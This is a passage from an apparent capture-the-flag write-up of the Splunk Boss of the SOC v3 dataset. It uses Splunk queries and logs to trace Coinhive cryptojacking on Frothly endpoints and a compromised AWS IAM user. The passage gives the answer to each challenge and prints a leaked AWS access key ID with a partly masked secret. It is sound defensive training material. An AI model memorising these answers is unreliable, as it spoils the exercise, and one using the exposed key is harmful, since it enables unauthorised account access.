 httpd              x86_64 2.2.34-1.16.amzn1          amzn-main           1.2 M
 libmemcached       x86_64 1.0.16-5.8.amzn1           amzn-main           271 k
 memcached          x86_64 1.4.15-10.15.amzn1         amzn-main            88 k
 osquery            x86_64 3.2.6-1.linux              osquery-s3-rpm-repo 8.0 M
 php                x86_64 5.3.29-1.8.amzn1           amzn-main           2.8 M
 php-mysql          x86_64 5.3.29-1.8.amzn1           amzn-main           178 k
 php-pecl-memcached x86_64 2.1.0-3.5.amzn1            amzn-main            45 k
Installing for dependencies:
 apr                x86_64 1.5.2-5.13.amzn1           amzn-main           118 k
 apr-util           x86_64 1.5.4-6.18.amzn1           amzn-main            99 k
 apr-util-ldap      x86_64 1.5.4-6.18.amzn1           amzn-main            19 k
 compat-gmp4        x86_64 4.3.2-1.14.amzn1           amzn-main           302 k
 httpd-tools        x86_64 2.2.34-1.16.amzn1          amzn-main            80 k
 mysql55-libs       x86_64 5.5.60-1.21.amzn1          amzn-updates        816 k
 php-cli            x86_64 5.3.29-1.8.amzn1           amzn-main           2.6 M
 php-common         x86_64 5.3.29-1.8.amzn1           amzn-main           1.0 M
 php-pdo            x86_64 5.3.29-1.8.amzn1           amzn-main           170 k
 php-pear           noarch 1:1.10.1-1.19.amzn1        amzn-main           413 k
 php-pecl-igbinary  x86_64 1.1.2-0.2.git3b8ab7e.3.amzn1
                                                      amzn-main            30 k
 php-process        x86_64 5.3.29-1.8.amzn1           amzn-main            66 k
 php-xml            x86_64 5.3.29-1.8.amzn1           amzn-main           234 k
Transaction Summary
================================================================================
Install  7 Packages (+13 Dependent packages)
```

> ANSWER: `7,13`
{: .prompt-info }

#### Question 10 (210): What is the short hostname of the only Frothly endpoint to actually mine Monero cryptocurrency? (Example: ahamilton instead of ahamilton.mycompany.com)

This question directly follows the CPU-based analysis from Question 8. As previously established, the only endpoint to run `chrome.exe` and hit 100% CPU usage was: `BSTOLL-L` - BudStoll's endpoint.

This matches the behavior of Monero mining, and no other endpoint demonstrated similar behavior. But question revealed several questions:
- Why CPU but not GPU or even Asics, because that's Monero.
- A tons of chrome processes use for crypto mining but no indicator of compromise in host machine really triggerd an alert about browser-based crypto mining
- Assume that `.txt` extracted suspicious zipped contain information of

> ANSWER: `BSTOLL-L`
{: .prompt-info }

> **A THOUGHT FROM QUESTIONS 208-210:**  
> After reading write-ups from others, it seems most people approached these questions like a simple "find the answer and fill in the blank" task. That’s totally fine-no judgment on how anyone tackles this kind of CTF.  
>  
> However, I came across a blog post by [clo.ng](https://clo.ng/blog/bots-part2/), and I was genuinely excited to see someone else struggling with these questions-not because they were technically difficult, but because of the **lack of context and the vague structure of the questions**. It’s reassuring to know the confusion wasn’t just on my end.
{: .prompt-warning }


#### MID-SERIES RECAP

Before continuing this series, let’s take a moment to slow down and chain together what we've uncovered so far.

I have to admit, I got a bit lost in the previous questions. It became difficult to map some of the activities to the MITRE ATT&CK kill chain due to the lack of context. Here's a breakdown of what we observed:

- The adversary gained a foothold in the Frothly environment via a publicly exposed S3 bucket.
- They injected a malicious ZIP file into the bucket.
- A web server fetched the contents of the bucket through an automated script (`s3update.py`). However, there was no clear evidence that the web server actually executed the contents of the ZIP.
- Bud Stoll downloaded and opened the file, which had a `.txt` extension.
- There was no obvious malicious execution on `BSTOLL-L` (possibly Bud Stoll's laptop).
- Despite that, the endpoint showed signs of cryptojacking-specifically, multiple `chrome.exe` processes consuming 100% CPU.

**Unanswered Questions**

There are several aspects I couldn’t make sense of:

- How could a `.txt` file lead to a cryptojacking incident? There was no associated process or command line activity (as seen in the timeline) to indicate execution.
- How did a legitimate process like `chrome.exe` hit 100% CPU? There were no signs of process injection, hollowing, or hijacking.

At this point, the only clear indicator of compromise was the malicious ZIP file (Initial Access). Without evidence of execution, it was hard to move forward meaningfully. Simply finding flags to answer questions doesn’t help us *learn* anything.

After spent several hours researching and finally came across something that blew my mind, and potentially unlocks the whole series.

Let’s talk briefly about cryptocurrency:

- **Bitcoin** is the most well-known cryptocurrency. We’ve all seen giant mining farms built with custom hardware-**ASICs**-designed for nothing but complex math. They're powerful but expensive and have no resale value once obsolete.
- Bitcoin’s blockchain ledger is also public, you can trace who sent what to whom and how much.

In contrast:

- **Monero (XMR)** is a **privacy-focused** cryptocurrency. It can be mined efficiently using **CPUs**, and transactions are untraceable.
- Monero mining happens in two primary ways:
  1. Installing dedicated software to run mining operations.
  2. **Browser-based mining**, users visit a website and unknowingly contribute CPU resources via JavaScript APIs. Once they leave the site, mining stops.

**Coinhive**

One of the most infamous browser-based mining platforms was **Coinhive**, popular around 2017-2018.

Coinhive was marketed as a **win-win** model:
- Website owners could earn revenue from visitors **without ads**.
- Visitors contributed a small amount of CPU power (often throttled) and enjoyed an ad-free experience.

Unfortunately, adversaries **abused** this model:
- They embedded Coinhive scripts **without CPU throttling**, **without notice**, and **without user consent**, resulting in cryptojacking.

**Connecting the kill-chain**

This revelation tied a lot of loose ends together:

- The `.txt` file Bud Stoll opened may have contained an embedded **malicious link** or **hidden redirection**.
- Once opened, it may have triggered the browser (`chrome.exe`) to **visit a cryptojacking website** running Coinhive or a similar script.
- That's why `chrome.exe` spiked to 100% CPU-without any clear malware or injected payload.

**Useful Resources**

Below are some resouces i used to clear the picture:

- [How and Why to Mine Monero](https://www.youtube.com/watch?v=lu0k59y5z3E&t=561s) by Mental Outlaw  
- [A Look into the Global Drive-by Cryptocurrency Mining Phenomenon](https://www.malwarebytes.com/blog/news/2017/11/a-look-into-the-global-drive-by-cryptocurrency-mining-phenomenon) by Malwarebytes  
- [Who and What Is Coinhive?](https://krebsonsecurity.com/2018/03/who-and-what-is-coinhive/) by Krebs on Security

**Victim:**  
- Bud Stoll

**Malicious Content:**  
- `frothly_html_memcached.txt` (Used to lure the user into a drive-by cryptojacking site)

**Tactics/Techniques (MITRE ATT&CK):**
- **Execution (TA0002)**
  - T1204.001 - User Execution: Malicious Link
- **Impact (TA0040)**
  - T1496 - Resource Hijacking

#### Question 11 (211): How many cryptocurrency mining destinations are visited by Frothly endpoints?
Since we've already identified that `chrome.ex`e is the process responsible for cryptomining activity, and we know Bud Stoll’s computer was compromised via drive-by cryptojacking, the next step is to determine which websites he visited that could have triggered the attack.

First, I traced all the websites Bud Stoll accessed during the infection window - the timeframe between the first and last appearance of `chrome.exe` consuming 100% CPU:

```sql
index=botsv3 sourcetype=wineventlog host="BSTOLL-L" *chrome* Outbound 
earliest="08/20/2018:20:37:50" latest="08/20/2018:21:04:11"
AND (Destination_Port=443 OR Destination_Port=80)
|dedup Destination_Address
|table Destination_Address
```

![pic18](/assets/images/botsv3/pic18.png)
_42 distinct IP addresses that Bud’s machine communicated with during that period._

To get more context, I correlated this data with DNS queries to identify actual domain names. This query pulled DNS resolutions linked to the identified destination IPs.

```sql
index=botsv3 sourcetype=stream:dns 
[search index=botsv3 sourcetype=wineventlog host="BSTOLL-L" *chrome* Outbound 
earliest="08/20/2018:20:37:50" latest="08/20/2018:21:04:11"
AND (Destination_Port=443 OR Destination_Port=80)
|dedup Destination_Address
|fields Destination_Address 
|rename Destination_Address as host_addr{}
|format
]
|table query{}
|stats count by query{}
```

Surprisingly, one of the resolved domains was `coinhive.com` - a well-known browser-based Monero mining platform.

![pic19](assets/images/botsv3/pic19.png)

Wanting to see how widespread this was, I broadened the search across all Frothly endpoints, removing the time constraint and filtering for any connection to `coinhive.com`.

```sql
index=botsv3 sourcetype=stream:dns 
[search index=botsv3 sourcetype=wineventlog host=* *chrome* Outbound 
AND (Destination_Port=443 OR Destination_Port=80)
|dedup Destination_Address
|fields Destination_Address 
|rename Destination_Address as host_addr{}
|format
]
AND *coinhive.com
|table query{}
|stats count by query{}
```

![pic20](assets/images/botsv3/pic20.png)

This revealed that six distinct Coinhive-related domains were visited by Frothly endpoints, there were 2 endpoints contacted to those domain:
- BSTOLL-L
- MKRAEUS-L

**Victim**
- BSTOLL-L
- MKRAEUS-L

**Malicous Contents**
- coinhive.com - 104.20.209.59
- ws001.coinhive.com - 217.182.164.14
- ws005.coinhive.com - 37.187.165.41
- ws011.coinhive.com - 37.187.166.108
- ws014.coinhive.com - 37.187.167.21
- ws019.coinhive.com - 37.187.167.47
  
> ANSWER: `6`
{: .prompt-info }

#### Question 12 (212): Using Splunk's event order functions, what is the first seen signature ID of the coin miner threat according to Frothly's Symantec Endpoint Protection (SEP) data?

Since there were no obvious indicators carried over from previous questions, I started with a broad search in the EDR platform for any events mentioning coin mining activity. This returned 46 events:

```sql
index=botsv3 sourcetype=symantec* AND *coin*
|reverse
|table _time user Host_Name Remote_Host_IP Intrusion_URL file_name Event_Description
|rename user as victim, Host_Name as victim_host, Remote_Host_IP as malicous_ip
```
![pic21](assets/images/botsv3/pic21.png)

The earliest relevant log:

```bash
2018 - 08 - 20 13:37:40, Major, BTUN - L, SHA - 256: 42D2F666AFD8A350A3F3BBCD736D7E35543D9DD9753B211C9F03C4F7E669ACE3, MD - 5:, [SID: 30358] Web Attack: JSCoinminer Download 8 attack blocked. Traffic has been blocked for this application: C:\WINDOWS\SYSTEMAPPS\MICROSOFT.MICROSOFTEDGE_8WEKYB3D8BBWE\MICROSOFTEDGECP.EXE, Local: 192.168.3.130, Local: 000000000000, Remote:, Remote: 54.67.127.227, Remote: 000000000000, Inbound, TCP, Intrusion ID: 0, Begin: 2018 - 08 - 18 20:51:14, End: 2018 - 08 - 18 20:51:14, Occurrences: 1, Application: C:/WINDOWS/SYSTEMAPPS/MICROSOFT.MICROSOFTEDGE_8WEKYB3D8BBWE/MICROSOFTEDGECP.EXE, Location: Default, User: BillyTun, Domain: AzureAD, Local Port 63140, Remote Port 80, CIDS Signature ID: 30358, CIDS Signature string: Web Attack: JSCoinminer Download 8, CIDS Signature SubID: 70481, Intrusion URL: www.brewertalk.com / forumdisplay.php?fid = 9, Intrusion Payload URL:
```

Interestingly, the IP address blocked for the JavaScript Coinminer attack is tied to Frothly’s own web infrastructure, specifically an AWS Elastic Load Balancer. All three of Frothly's web servers were redundantly configured and fetched a malicious zip file at some earlier stage.

Unfortunately, despite this connection, I could not find a `.js` file or any conclusive artifacts proving that the zipped contents led to direct cryptojacking via JavaScript. Still, the first seen signature ID remains clear.

> ANSWER: `30358`
{: .prompt-info }

#### Question 13 (213): According to Symantec's website, what is the severity of this specific coin miner threat?	

This is a follow-up to Question 12. The severity rating for this signature ID (30358) is listed on Broadcom's Security Center:

[Web Attack: JSCoinminer Download 8](https://www.broadcom.com/support/security-center/attacksignatures/detail?asid=30358)

> ANSWER: `Medium`
{: .prompt-info }

#### Question 14 (214): What is the short hostname of the only Frothly endpoint to show evidence of defeating the cryptocurrency threat? (Example: ahamilton instead of ahamilton.mycompany.com)

All alerts related to the coin miner activity-including those indicating successful blocking-were observed on a single endpoint: `BTUN-L`, which belongs to Billy Tun.

> ANSWER: `BTUN-L`
{: .prompt-info }

#### Question 15 (215): What is the FQDN of the endpoint that is running a different Windows operating system edition than the others?

This question feels like a classic CTF-style prompt, possibly with some hidden hints. From experience in previous Boss of the SOC (BOTS) scenarios, we know that the `WinHostMon` sourcetype includes detailed Windows host metadata.

To start, I searched for all host information that contains OS data:

```sql
index=botsv3 sourcetype=WinHostMon (OS AND *Win*)
```

![pic23](assets/images/botsv3/pic23.png)

Since I wanted a higher-level summary, I used the Bird's Eye View approach to see which fields might reveal OS version data:

```sql
index=botsv3 sourcetype=WinHostMon (OS AND *Win*)
| fieldsummary 
| fields field values value 
| rex field=values max_match=0 "\"value\":\"(?<value>[^\"]+)\""
| fields field value
| where isnotnull(value)
```

![pic24](assets/images/botsv3/pic24.png)

As expected, there was a field that reliably includes OS details. Using a focused query, I filtered by host and OS:

```sql
index=botsv3 sourcetype=WinHostMon (OS AND *Win*)
|table OS host 
|stats count by OS host
```
Output:

| OS                              | host      | count |
| ------------------------------- | --------- | ----- |
| Microsoft Windows 10 Enterprise | BSTOLL-L  | 30    |
| Microsoft Windows 10 Pro        | ABUNGST-L | 16    |
| Microsoft Windows 10 Pro        | BGIST-L   | 23    |
| Microsoft Windows 10 Pro        | BTUN-L    | 29    |
| Microsoft Windows 10 Pro        | FYODOR-L  | 23    |
| Microsoft Windows 10 Pro        | JWORTOS-L | 30    |
| Microsoft Windows 10 Pro        | MKRAEUS-L | 25    |
| Microsoft Windows 10 Pro        | PCERF-L   | 28    |

From the output, it's clear that only one machine - `BSTOLL-L` is running Microsoft Windows 10 Enterprise, while all others are using the Pro edition:

To find the FQDN of `BSTOLL-L`, I queried the `wineventlog` sourcetype using common logon Event Codes (4624 for successful logon, 4625 for failure):

```sql
index=botsv3 sourcetype=wineventlog AND host=BSTOLL-L AND EventCode=4624 OR EventCode=4625
```

```log
08/20/2018 03:16:37 AM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=BSTOLL-L.froth.ly <---- This confirms the full hostname.
TaskCategory=Logon
OpCode=Info
RecordNumber=989781
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		BSTOLL-L$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7
```

> ANSWER: `BSTOLL-L.froth.ly`
{: .prompt-info }

#### Question 16 (216): According to the Cisco NVM flow logs, for how many seconds does the endpoint generate Monero cryptocurrency? Answer guidance: Round to the nearest second without the unit of measure.
We previously identified that some Frothly endpoints had accessed coinhive.com, a well-known browser-based Monero mining service often abused by attackers. It’s reasonable to analyze how long an affected user might have unknowingly donated CPU resources to this malicious site.

**Understanding the Log Source**
The question points us to Cisco NVM (Network Visibility Module) flow logs. According to Cisco’s documentation - [Install and Configure Cisco Network Visi](https://www.cisco.com/c/en/us/support/docs/security/anyconnect-secure-mobility-client/200600-Install-and-Configure-Cisco-Network-Visi.html#anc19), NVM data can be forwarded to a Syslog server, which matches our environment.

We had already collected Coinhive-related IP addresses from a previous question:
- coinhive.com - 104.20.209.59
- ws001.coinhive.com - 217.182.164.14
- ws005.coinhive.com - 37.187.165.41
- ws011.coinhive.com - 37.187.166.108
- ws014.coinhive.com - 37.187.167.21
- ws019.coinhive.com - 37.187.167.47

Using these, i could run the following Splunk query to identify NVM flow logs related to Coinhive access:

```sql
index=botsv3 sourcetype=syslog source=cisconvmflowdata 
AND (104.20.209.59 OR 217.182.164.14 OR 37.187.165.41 OR 37.187.166.108 OR 37.187.167.21 OR 37.187.167.47)
|reverse 
```

![pic26](assets/images/botsv3/pic26.png)
_This search returned five relevant events_

**Log Breakdown** - Here is a sample NVM flow log:

Example log:

```log
Aug 20 14:05:23 splunkhwf.froth.ly  fv="nvzFlow_v3" pr="6" sa="192.168.247.131" sp="49844" da="37.187.167.47" dp="443" fss="1534772317" fst="Mon Aug 20 13:38:37 2018" fes="1534773920" fet="Mon Aug 20 14:05:20 2018" udid="1DD75FEDA01F1AE457AF4307EA6DCA0946CFED56" liuid="AzureAD\BudStoll" liuida="AzureAD" liuidp="BudStoll" liuat="2" pa="AzureAD\BudStoll" paa="AzureAD" pap="BudStoll" puat="2" pn="chrome.exe" ph="268A0463D7CB907D45E1C2AB91703E71734116F08B2C090E34C2D506183F9BCA" ppa="AzureAD\BudStoll" ppuat="2" ppn="explorer.exe" pph="B951F9AABB30855DE4682E924B036397500885C2FB328203156C30456F70B41A" ibc="19656" obc="25101" ds="localdomain" dh="ws019.coinhive.com" iid="41" mnl="''" mhl="''"
```

Field destruction:

| Field                            | Meaning                                                                               |
| -------------------------------- | ------------------------------------------------------------------------------------- |
| `fv="nvzFlow_v3"`                | Flow version - Indicates the NVM flow log format version (v3 in this case)            |
| `pr="6"`                         | Protocol - Protocol number 6 refers to TCP (from the IP protocol suite)               |
| `sa="192.168.247.131"`           | Source IP address (internal)                                                          |
| `sp="49844"`                     | Source port - random high port used by the source                                     |
| `da="37.187.167.47"`             | Destination IP address (external)                                                     |
| `dp="443"`                       | Destination port - in this case, HTTPS (443)                                          |
| `fss="1534772317"`               | Flow start timestamp (epoch) - raw format                                             |
| `fst="Mon Aug 20 13:38:37 2018"` | Flow start time (human-readable)                                                      |
| `fes="1534773920"`               | Flow end timestamp (epoch) - raw format                                               |
| `fet="Mon Aug 20 14:05:20 2018"` | Flow end time (human-readable)                                                        |
| `udid="1DD75F...CFED56"`         | Unique Device Identifier (UDID) - used to correlate flows per device                  |
| `liuid="AzureAD\BudStoll"`       | Logged-in User ID - full user identity with domain                                    |
| `liuida="AzureAD"`               | User domain/account authority (Azure Active Directory)                                |
| `liuidp="BudStoll"`              | Username part only, without domain                                                    |
| `liuat="2"`                      | Login auth type - usually: 1 = local, 2 = domain                                      |
| `pa="AzureAD\BudStoll"`          | Primary account (same as liuid) - possibly used in SSO scenarios                      |
| `paa="AzureAD"`                  | Primary account authority                                                             |
| `pap="BudStoll"`                 | Primary account principal name                                                        |
| `puat="2"`                       | Primary account auth type                                                             |
| `pn="chrome.exe"`                | Process name - the executable that initiated the connection                           |
| `ph="268A04...F9BCA"`            | Process hash (SHA256) - allows integrity verification or threat intelligence matching |
| `ppa="AzureAD\BudStoll"`         | Parent process account - who launched this process                                    |
| `ppuat="2"`                      | Parent process auth type                                                              |
| `ppn="explorer.exe"`             | Parent process name - the process that spawned `chrome.exe`                           |
| `pph="B951F9...B41A"`            | Parent process hash                                                                   |
| `ibc="19656"`                    | Inbound byte count - data received                                                    |
| `obc="25101"`                    | Outbound byte count - data sent                                                       |
| `ds="localdomain"`               | DNS suffix/domain                                                                     |
| `dh="ws019.coinhive.com"`        | DNS hostname resolved during flow                                                     |
| `iid="41"`                       | Interface ID - internal identifier used by Cisco AnyConnect/NVM agent                 |
| `mnl="''"`                       | Module name list                                                                      |
| `mhl="''"`                       | Module hash list                                                                      |

From these fields, we can determine the start and end time of Bud Stoll's connection to the mining domain by utilize 2 field: `fst` for start time and `fet` for the end time.

Now i could calculate the full duration across all matching logs:

```sql
index=botsv3 sourcetype=syslog source=cisconvmflowdata 
AND (104.20.209.59 OR 217.182.164.14 OR 37.187.165.41 OR 37.187.166.108 OR 37.187.167.21 OR 37.187.167.47)
|stats min(fss) as first_time max(fes) as last_time
|eval duration_seconds = last_time - first_time
|eval duration_human = tostring(duration_seconds, "duration")
```

![pic27](assets/images/botsv3/pic27.png)

That means Bud Stoll’s machine was interacting with Coinhive infrastructure for approximately 1666 seconds (~27.8 minutes).

> ANSWER: `1666`
{: .prompt-info }

**ADDITIONAL CONTEXT**
While 30 minutes may not seem long, it’s significant enough for cryptojacking to occur, especially given the browser (Chrome) was involved. Earlier evidence also showed three Frothly websites were compromised and redirected users to brewertalk.com, which likely hosted the mining script.

Bud Stoll may have been investigating or testing this malicious `.txt` file we saw in earlier questions, ultimately leading him to Coinhive-linked domain, intentionally or unintentionally donating CPU cycles to the attacker.

#### Question 17 (217): What kind of Splunk visualization was in the first file attachment that Bud emails to Frothly employees to illustrate the coin miner issue? Answer guidance: Two words. (Example: choropleth map)

This question reinforces the hypothesis from the previous challenge - Bud Stoll detected suspicious activity inside Frothly’s environment and initiated an investigation, eventually alerting the company about a coin miner issue.

To analyze Bud’s email activity, we focus on the `stream:smtp` sourcetype. If you're familiar with earlier Boss of the SOC (v1 and v2), this sourcetype is a treasure trove for email-related data.

We want to find emails sent by Bud Stoll that contain file attachments:

```sql
index=botsv3 sourcetype=stream:smtp 
|spath sender_alias
|search sender_alias="Bud Stoll"
AND attach_filename{}!=""
|reverse
```

![pic28](assets/images/botsv3/pic28.png)

Only four events were returned. Manual inspection is easy in this case. One email stood out-it was addressed to: `allhands <allhands@froth.ly>`

This indicates a broadcast to all Frothly members and that email also included two JPEG attachments:
- `image002.jpg`  
- `image003.jpg`

By reviewing Email Conversation, i found something interested

Here’s the extracted email thread:
```log
     Wow Billy. I did find the issue! Look at the Splunk chart below - I saw som=
e instances spin up which was strange. Then I looked at the CPU of my local=
 Chrome browser and noticed it spiked to 100%! I will work on recovering no=
w - it looks like some malicious code got into our forums.

[cid:image002.jpg@01D4247D.2394E720]

From: Bud Stoll
Sent: Thursday, July 26, 2018 1:03 AM
To: Billy Tun <btun@froth.ly>; allhands <allhands@froth.ly>
Subject: RE: Improved brewertalk.com - check it out!

Yeah. It looks like we have some issues - I haven't figured it out yet...bu=
t check out the metrics store search below....

I'll figure it out!

-bud

[cid:image003.jpg@01D4247D.2394E720]

From: Billy Tun
Sent: Thursday, July 26, 2018 1:02 AM
To: Bud Stoll <bstoll@froth.ly<mailto:bstoll@froth.ly>>; allhands <allhands=
@froth.ly<mailto:allhands@froth.ly>>
Subject: RE: Improved brewertalk.com - check it out!

Hey folks,

Looks like brewertalk is super slow, and my machine also seems to be slow. =
Not sure what's going on but thought I'd mention it. Any ideas, Bud?



From: Bud Stoll
Sent: Thursday, July 26, 2018 12:19 AM
To: allhands <allhands@froth.ly<mailto:allhands@froth.ly>>
Subject: Improved brewertalk.com - check it out!

Hey Frothlies!

I just added some great improvements to brewertalk.com to better handle for=
um threads and allow for posts of multi-media kinds of files rather than ju=
st photos. And it's all running in our new swanky AWS environment ("the clo=
ud" for those of you not sure what that is!) I think you'll be impressed en=
ough to maybe buy me a beer!  Let me know.

http://www.brewertalk.com

-BS

Bud Stoll
Head IT Guy and AWS Wizard
Frothly
```

The thread reveals how Bud identified the cryptojacking activity. He observed CPU spikes on his Chrome browser and created a Splunk chart to show the impact.

But how to extract the attachment and see whats in it ? 

To examine the image contents, we look at the `content` field in the email logs. It contains embedded base64-encoded files. For example:

```log
     Content-Type: image/jpeg; name="image002.jpg"
Content-Description: image002.jpg
Content-Disposition: inline; filename="image002.jpg"; size=158643;
	creation-date="Mon, 15 Sep 2018 02:44:21 GMT";
	modification-date="Mon, 15 Sep 2018 02:44:21 GMT"
Content-ID: <image002.jpg@01D4247D.2394E720>
Content-Transfer-Encoding: base64

    /9j/4AAQSkZJRgABAQEAjACMAAD/2wBDAAoHBwgHBgoICAgLCgoLDhgQDg0NDh0VFhEYIx8lJCIf
IiEmKzcvJik0KSEiMEExNDk7Pj4+JS5ESUM8SDc9Pjv/2wBDAQoLCw4NDhwQEBw7KCIoOzs7Ozs7
Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozv/wAARCAPRDAADASIA
AhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQA
AAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3
...
```
Since the images was base64-encoded, we could extract all the blob words, put it into [Cyberchef](https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false) and download the `Output` part to see the real content inside the image.


Once decoded, both `image002.jpg` and `image003.jpg` reveals a Splunk column chart showing CPU usage over time for various endpoints.

![pic25](assets/images/botsv3/pic25.png)

Affected endpoints include, these are the same hosts we investigated in earlier questions. Bud visualized how their CPU usage spiked due to cryptojacking when visiting the compromised Frothly site.
- BSTOLL-L
- BTUN-L
- MKRAEUS-L

> ANSWER: `Column Chart`
{: .prompt-info }

#### Question 18 (218): What IAM user access key generates the most distinct errors when attempting to access IAM resources?

When I first read this question, I tried to link it to the previous one. However, it quickly became clear that this might point to a completely different AWS security incident, especially when you look ahead to the next question.

Before diving into the investigation, it’s helpful to revisit how [Amazon Resource Names (ARNs)](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference-arns.html) work

ARNs are unique identifiers for AWS resources and typically follow one of these formats:
- `arn:partition:service:region:account-id:resource-id`
- `arn:partition:service:region:account-id:resource-type/resource-id`
- `arn:partition:service:region:account-id:resource-type:resource-id`

You can refer to the AWS documentation above for a breakdown of each field.

Since the question involves IAM resources, we filtered the logs for relevant entries using the following Splunk query:

```sql
index=botsv3 sourcetype=aws:cloudtrail AND userIdentity.arn=*iam* AND eventSource=iam.amazonaws.com
AND errorMessage!=""
|table user src_ip user_access_key errorMessage reason
```
![pic29](assets/images/botsv3/pic29.png)

This revealed several repeated error messages tied to various users. To determine which access key triggered the most distinct IAM errors, we can simply count the number of unique reasons per access key:

```sql
index=botsv3 sourcetype=aws:cloudtrail AND userIdentity.arn=*iam* AND eventSource=iam.amazonaws.com
AND errorMessage!=""
|table user src_ip user_access_key errorMessage reason
|stats dc(reason) by user_access_key
```
![pic30](assets/images/botsv3/pic30.png)

From the results, we identified the key `AKIAJOGCDXJ5NW5PXUPA` as the one associated with the highest number of distinct error messages. Digging deeper, we determined that this access key belongs to the IAM user `web_admin`.

![pic31](assets/images/botsv3/pic31.png)

Further inspection of this user’s activity reveals suspicious behavior, potentially indicating that the AWS account has been compromised.

```sql
index=botsv3 sourcetype=aws:cloudtrail AND userIdentity.arn=*iam* AND eventSource=iam.amazonaws.com
AND errorMessage!="" AND user_access_key=AKIAJOGCDXJ5NW5PXUPA
|reverse 
|table _time userIdentity.userName src_ip userAgent reason
```

![pic32](assets/images/botsv3/pic32.png)

I checked the associated IP addresses to see if they matched any from the previous `coinhive` browser-based cryptojacking incident, but found no overlap. Based on that, it might appears this is a separate incident.

> ANSWER: `AKIAJOGCDXJ5NW5PXUPA`
{: .prompt-info }

#### Question 19 (219): Bud accidentally commits AWS access keys to an external code repository. Shortly after, he receives a notification from AWS that the account had been compromised. What is the support case ID that Amazon opens on his behalf?

This question further confirms our earlier suspicion - an actual security incident involving a compromised IAM user has occurred.

Accidentally pushing AWS credentials to a public code repository is a serious cloud security concern and goes against best practices. Platforms like GitHub or GitLab often automatically scan repositories and notify users if secrets are exposed. In this case, it appears that’s exactly what happened.

Since we already built a timeline for the Stage 1 incident, we can cross-reference that with the SMTP logs to check if any alert emails were received during the relevant window.

```sql
index=botsv3 sourcetype=stream:smtp 
AND earliest="08/20/2018:16:16:12" AND latest="08/20/2018:16:30:00"
|spath "receiver_alias{}" 
|search "receiver_alias{}"="bstoll@froth.ly"
```

This query returned one event from `no-reply-aws@amazon.com`, which confirms that AWS notified Bud Stoll of the incident.

The `content_body` of the email provides clear evidence that the `web_admin` IAM user's credentials had been exposed and subsequently abused:

```log
     Amazon Web Services has opened case 5244329601 on your behalf.

     Case ID: 5244329601
Subject: Your AWS account 622676721278
      is compromised
Severity: Urgent
Correspondence: Dear AWS Customer,

Your AWS Account is compromised! Please review the following notice and take immediate action to secure your account.

Your security is important to us. We have become aware that the AWS Access Key AKIAJOGCDXJ5NW5PXUPA (belonging to IAM user "web_admin") along with the corresponding Secret Key is publicly available online at https://github.com/FrothlyBeers/BrewingIOT/blob/e4a98cc997de12bb7a59f18aea207a28bcec566c/MyDocuments/aws_credentials.bak.

This poses a security risk to your account and other users, could lead to excessive charges from unauthorized activity or abuse, and violates the AWS Customer Agreement.

Please delete the exposed credentials from your AWS account by using the instructions below and take steps to prevent any new credentials from being published in this manner again. Unfortunately, deleting the keys from the public website and/or disabling them is NOT sufficient to secure your account.

To additionally protect your account from excessive charges, we have temporarily limited your ability to create some AWS resources. Please note that this does not make your account secure, it just partially limits the unauthorized usage for which you could be charged.

Detailed instructions are included below for your convenience.

CHECK FOR UNAUTHORIZED USAGE
We strongly encourage you to immediately review your AWS account for any unauthorized A
     WS usage, suspect running instances, or inappropriate IAM users and policies. To check the usage, please log into your AWS Management Console and go to each service page to see what resources are being used. Please pay special attention to the running EC2 instances and IAM users, roles, and groups. You can also check for any unexpected usage on the "Bills" page in the Billing console.

https://console.aws.amazon.com/billing/home#/bill

Please keep in mind that unauthorized usage can occur in any region and that in your console you only see one region at a time. To switch between regions, you can use the dropdown in the top-right corner of the console screen.

DELETE THE KEY (ROOT ACCOUNT)
If you are not using the access key, you can simply delete it. To delete the exposed key, visit the "Security Credentials" page here: https://console.aws.amazon.com/iam/home#security_credential. Your keys will be listed in the "Access Keys" section.

DELETE THE KEY (IAM USERS)
Navigate to your IAM Users list in the AWS Management Console, here: https://console.aws.amazon.com/iam/home#users. Please select the IAM user identified above. Click on the "User Actions" drop-down menu and then click "Manage Access Keys" to show that user's active Access Keys. Click "Delete" next to the access key identified above.

ROTATE THE KEY
If your application uses the access key, you need to replace the exposed key with a new one. To do this, first create a second key (at that point both keys will be active) and modify your application to use the new key.
Then disable (but do not delete) the first key. If there are any problems with your application, you can make the first key active again. When your application is fully functional with the first key inactive, please delete the first key.

Please follow the Best Practices of Managing your Access Keys at http://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html.

If you have any additional questions or concerns regarding this notification, please reach out to us via the AWS Support Center: https://aws.amazon.com/support.
=======================================

To contact us again about this issue, please use the following link to enter your correspondence or attach any files you think would be useful:

https://console.aws.amazon.com/support/home?#/case/?caseId=5244329601&displayId=5244329601&language=en

(If you will connect by federation, log in before following the link.)

Sincerely,
The Amazon Web Services Team

*Please note: this e-mail was sent from an address that cannot accept incoming e-mail. Please use the appropriate link above if you need to contact us again about this same issue. 

Amazon Web Services, Inc. is an affiliate of Amazon.com, Inc. Amazon.com is a registered trademark of Amazon.com, Inc. or its affiliates.
```

> ANSWER: `5244329601`
{: .prompt-info }

#### Question 20 (220): AWS access keys consist of two parts: an access key ID (e.g., AKIAIOSFODNN7EXAMPLE) and a secret access key (e.g., wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY). What is the secret access key of the key that was leaked to the external code repository?

By followed the link provided in the AWS email notification: (Exposed Repo)(https://github.com/FrothlyBeers/BrewingIOT/blob/e4a98cc997de12bb7a59f18aea207a28bcec566c/MyDocuments/aws_credentials.bak)

We found credentials for the `web_admin` IAM user, including both the access key ID and the secret access key, confirming that the secret was exposed publicly.

```shell
[web_admin]
***_access_key_id = AKIAJOGCDXJ5NW5PXUPA
***_secret_access_key = ****************dROqhELPtXJSR*****
region = us-west-1
```

